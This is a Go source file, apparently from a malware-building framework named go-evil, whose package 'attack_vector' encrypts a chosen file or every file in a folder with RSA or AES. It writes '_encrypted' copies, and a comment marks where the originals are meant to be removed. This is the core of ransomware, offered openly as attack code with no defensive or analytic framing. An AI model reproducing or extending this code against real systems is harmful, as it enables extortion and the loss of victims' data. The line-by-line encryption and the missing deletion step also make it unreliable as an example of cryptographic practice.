package attack_vector

import (
	"bufio"
	"os"
	"strings"

	enc_aes "github.com/s9rA16Bf4/go-evil/domains/algorithm/encryption/aes"
	enc_rsa "github.com/s9rA16Bf4/go-evil/domains/algorithm/encryption/rsa"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// We target files, folders to encrypt

type target_t struct {
	target_name       string
	encryption_method string
	target_type       string // File or Folder
}

var encryption_methods = []string{"rsa", "aes"}
var c_target target_t

func Encrypt_set_target(path string) { // Either a file or a folder
	info, err := os.Stat(path)
	if err != nil { // The target didn't exist
		notify.Error(err.Error(), "attack_vector.Encrypt_set_target()")
	}
	if info.IsDir() {
		c_target.target_type = "dir"
	} else {
		c_target.target_type = "file"
	}

	c_target.target_name = path
}

func Encrypt_set_encryption_method(method string) {

	// Check if method exists
	found := false
	for _, allowed_meth := range encryption_methods {
		if allowed_meth == method {
			found = true
		}
	}
	if !found {
		notify.Error("Unknown encryiption methond "+method, "attack_vector.Encrypt_set_encryption_method()")
	}

	c_target.encryption_method = method
	if method == "rsa" {
		enc_rsa.RSA_generate_private_keys("2048")
	} else {
		enc_aes.AES_generate_private_keys()
	}
}

func Encrypt_encrypt() {
	if c_target.target_type == "file" {
		Encrypt_encrypt_file(c_target.target_name)
	} else {
		Encrypt_encrypt_folder(c_target.target_name)
	}
}

func Encrypt_decrypt() {
	if c_target.target_type == "file" {
		Encrypt_decrypt_file(c_target.target_name)
	} else {
		Encrypt_decrypt_folder(c_target.target_name)
	}
}

func Encrypt_encrypt_folder(dir string) {
	folder, err := os.Open(dir)
	if err != nil {
		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_folder()")
	}
	children, _ := folder.Readdir(0)
	for _, child := range children {
		Encrypt_encrypt_file(dir + "/" + child.Name())
	}
}

func Encrypt_encrypt_file(file string) {
	in, err := os.Open(file) // Target
	if err != nil {
		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
	}
	enc_file, _ := os.Create(file + "_encrypted") // Our new file
	// Read every line
	file_out := bufio.NewScanner(in) // The files contents

	for file_out.Scan() { // Line for line
		if c_target.encryption_method == "rsa" {
			enc_rsa.RSA_encrypt(file_out.Text())                     // Gets the next line
			enc_file.WriteString(enc_rsa.RSA_get_encrypted() + "\n") // Gets the encrypted line and writes it to disk
		} else if c_target.encryption_method == "aes" {
			enc_aes.AES_encrypt(file_out.Text())                   // Gets the next line
			enc_file.WriteString(enc_aes.AES_get_encrypt() + "\n") // Gets the encrypted line and writes it to disk
		}
	}
	// Remove the file we encrypted
}
func Encrypt_decrypt_folder(dir string) {
	folder, err := os.Open(dir)
	if err != nil {
		notify.Error(err.Error(), "attack_vector.Encrypt_decrypt_folder()")
	}
	children, _ := folder.Readdir(0)
	for _, child := range children {
		if strings.HasSuffix(child.Name(), "_encrypted") {
			Encrypt_decrypt_file(dir + "/" + child.Name())
		}
	}
}

func Encrypt_decrypt_file(file string) {
	in, err := os.Open(file) // Target
	if err != nil {
		notify.Error(err.Error(), "attack_vector.Encrypt_encrypt_file()")
	}
	file = strings.ReplaceAll(file, "_encrypted", "")
	enc_file, _ := os.Create(file + "_decrypted") // Our new file
	// Read every line
	file_out := bufio.NewScanner(in) // The files contents
	for file_out.Scan() {            // Line for line
		if c_target.encryption_method == "rsa" {
			enc_rsa.RSA_decrypt(file_out.Text())                     // Gets the next line
			enc_file.WriteString(enc_rsa.RSA_get_decrypted() + "\n") // Gets the encrypted line and writes it to disk
		} else if c_target.encryption_method == "aes" {
			enc_aes.AES_decrypt(file_out.Text())                     // Gets the next line
			enc_file.WriteString(enc_aes.AES_get_decrypted() + "\n") // Gets the encrypted line and writes it to disk
		}
	}
}
